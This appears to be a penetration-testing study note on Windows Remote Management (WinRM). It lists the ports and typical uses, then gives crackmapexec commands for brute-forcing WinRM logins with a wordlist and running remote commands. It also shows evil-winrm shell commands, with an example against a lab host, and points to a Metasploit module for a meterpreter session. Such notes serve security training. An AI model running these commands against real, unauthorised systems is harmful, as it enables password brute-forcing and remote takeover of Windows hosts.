[**WinRM**](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) (**W**indows **R**emote **M**anagement Protocol): a protocol used to facilitate remote access with Windows systems over HTTP(S).
- Ports: `5985` - `5986` (TCP).
- Not configured by default.
- Used by systems administrator to:
	- Remotely access, interact and execute commands on Windows hosts on a LAN.
	- Remotely manage and configure Windows systems.

> [!NOTE]
> In Nmap, services do not have a specific banner to tell that there is running WinRM:
> ![[Pasted image 20250217112335.png]]

## Exploitation

> [**crackmapexec**](https://www.kali.org/tools/crackmapexec/): a python script, _a swiss army knife for pentesting Windows/Active Directory environments. From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more._
>
> Can be utilized for brute-force WinRM to find legitimate credentials.

Brute-force WinRM with crackmapexec:

```sh
crackmapexec [OPTIONS]
```

```sh
crackmapexec winrm <host> -u <user> -p <password_wordlist>
# crackmapexec winrm demo.ine.local -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Run remote commands:

```sh
crackmapexec winrm <host> -u <user> -p <password> -x "whoami"
crackmapexec winrm <host> -u <user> -p <password> -x "systeminfo"
```

Spawn a PowerShell:

```sh
evil-winrm -u aministrator -p <password> -i <host>
# evil-winrm -u administrator -p tinkerbell -i demo.ine.local
```

> [evil-winrm](https://www.kali.org/tools/evil-winrm/): a Ruby script used to obtain a command shell session on a target system.

```sh
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

> **Metasploit**
> Module `winrm_script_exec` to spawn a meterpreter session. It is important to set `FORCE_VBS` option to `true`.